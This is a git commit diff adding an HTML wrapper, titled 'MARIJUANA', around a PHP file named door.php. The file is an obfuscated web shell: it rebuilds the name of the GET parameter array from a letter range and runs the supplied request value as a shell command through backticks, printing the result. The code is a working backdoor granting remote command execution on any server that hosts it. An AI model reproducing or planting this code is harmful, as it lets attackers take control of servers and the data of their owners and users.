a927c31dd2ede3bd146f080c58c0e3ffb47a7bd1
CrotNime <77036646+CrotNime@users.noreply.github.com>
2021-01-06 10:56:54 +0700

    Add files via upload

--- door.php
+++ door.php
@@ -1,6 +1,14 @@
+<HTML>
+    <HEAD>
+        <TITLE>MARIJUANA</TITLE>
+    </HEAD>
+    <BODY>
+        <BR>
 <?php
 $_ = range("A","Z");
 $_ = $_[6].$_[4].$_[19];
 $_ = ${'_'.$_}['_'];
 ?>
 <?=`$_`; ?>
+    </BODY>
+</HTML>
